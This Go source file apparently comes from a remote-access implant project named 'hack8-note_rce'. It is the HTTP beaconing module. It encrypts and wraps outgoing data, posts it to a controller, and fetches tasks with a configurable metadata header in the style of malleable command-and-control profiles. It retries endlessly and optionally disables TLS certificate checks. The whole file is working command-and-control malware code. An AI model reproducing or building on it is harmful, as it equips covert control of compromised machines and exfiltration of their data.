package packet

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"hack8-note_rce/config"
	"hack8-note_rce/crypt"
	"net/http"
	"net/url"
	"time"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

func init() {
	httpRequest.SetTimeout(config.TimeOut * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)

	if config.ProxyOn {
		url_i := url.URL{}
		url_proxy, _ := url_i.Parse(config.Proxy)
		trans.Proxy = http.ProxyURL(url_proxy)
	}

	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
}

func HttpPost(url string, data []byte, cryptTypes []string) ([]byte, error) {
	for {
		data, _ = crypt.EncryptMultipleTypes(data, config.Http_post_client_output_crypt)
		data = append([]byte(config.Http_post_client_output_prepend), data...)
		data = append(data, []byte(config.Http_post_client_output_append)...)
		resp, err := httpRequest.Post(url, data, config.HttpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				//fmt.Println(resp.String())
				return ParsePostResponse(resp.Bytes(), cryptTypes)
			}
			break
		}
	}

	return nil, nil
}

// 封装get原始请求
func HttpGet(url string, cookies string, cryptTypes []string) ([]byte, error) {
	//已将请求识别为 Authentication
	metaData := req.Header{config.Http_get_metadata_header: config.Http_get_metadata_prepend + cookies}
	for {
		resp, err := httpRequest.Get(url, config.HttpHeaders, metaData)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				//result, err := ParseGetResponse(resp.Bytes())
				//fmt.Println(resp.Bytes())
				//fmt.Println(string(resp.Bytes()))
				//test, _ :=ParseGetResponse(resp.Bytes(), cryptTypes)
				//fmt.Println(string(test))
				if len(resp.Bytes()) == 0 {
					return nil, nil
				}
				return ParseGetResponse(resp.Bytes(), cryptTypes)
			}
			break
		}
	}
	return nil, nil
}

// 分析server传下来数据
func ParseGetResponse(data []byte, cryptTypes []string) ([]byte, error) {
	var err error

	data = bytes.TrimPrefix(data, []byte(config.Http_get_output_prepend))
	data = bytes.TrimSuffix(data, []byte(config.Http_get_output_append))
	data, err = crypt.DecryptMultipleTypes(data, cryptTypes)
	return data, err
}

// 向server端发送数据
func ParsePostResponse(data []byte, cryptTypes []string) ([]byte, error) {
	var err error
	data = bytes.TrimPrefix(data, []byte(config.Http_post_server_output_prepend))
	data = bytes.TrimSuffix(data, []byte(config.Http_post_server_output_append))
	data, err = crypt.DecryptMultipleTypes(data, cryptTypes)
	return data, err
}
